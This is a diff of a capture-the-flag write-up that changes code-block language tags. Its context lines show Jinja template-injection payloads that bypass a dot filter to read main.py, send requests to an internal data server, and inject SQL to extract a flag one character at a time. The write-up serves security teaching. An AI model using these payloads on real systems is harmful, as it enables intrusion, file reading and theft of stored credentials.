@@ -93,7 +93,7 @@ You'll notice in the main server code that the other server's IP is censored. Al
 
 Inspired by the payload above, we can type this into the `password` blank to read the contents of `main.py` (note the use of `'\x2e'` to bypass the `.` filter):
 
-```
+```py
 {{request['application']['__globals__']['__builtins__']['open']('main\x2epy')['read']()}}
 ```
 
@@ -118,7 +118,7 @@ It times out, which means the only way we can inject SQL into the data server is
 
 Since in the code, the request is stripped to alphanumeric before being sent over to the data server, we'll want to just use the template injection to send another request over:
 
-```
+```py
 {{request['application']['__globals__']['__builtins__']['__import__']('requests')['post']('http://172\x2e24\x2e0\x2e8:8080/runquery',json={'username':'','password':''})['text']}}
 ```
 
@@ -132,7 +132,7 @@ so sending the requests is working!
 
 Next, let's try some basic SQL injection:
 
-```
+```py
 {{request['application']['__globals__']['__builtins__']['__import__']('requests')['post']('http://172\x2e24\x2e0\x2e8:8080/runquery',json={'username':'','password':"' OR '1'='1"})['text']}}
 ```
 
@@ -154,7 +154,7 @@ Finally, we can try actually figuring out the letters of the flag. In [Amy The H
 
 For example, we know the first character of the flag is `L`. Let's check that using the `SUBSTR` function (note that SQL uses 1-indexed strings, rather than 0-indexed):
 
-```
+```py
 {{request['application']['__globals__']['__builtins__']['__import__']('requests')['post']('http://172\x2e24\x2e0\x2e8:8080/runquery',json={'username':'','password':"' OR SUBSTR(password,1,1)='L"})['text']}}
 ```
 
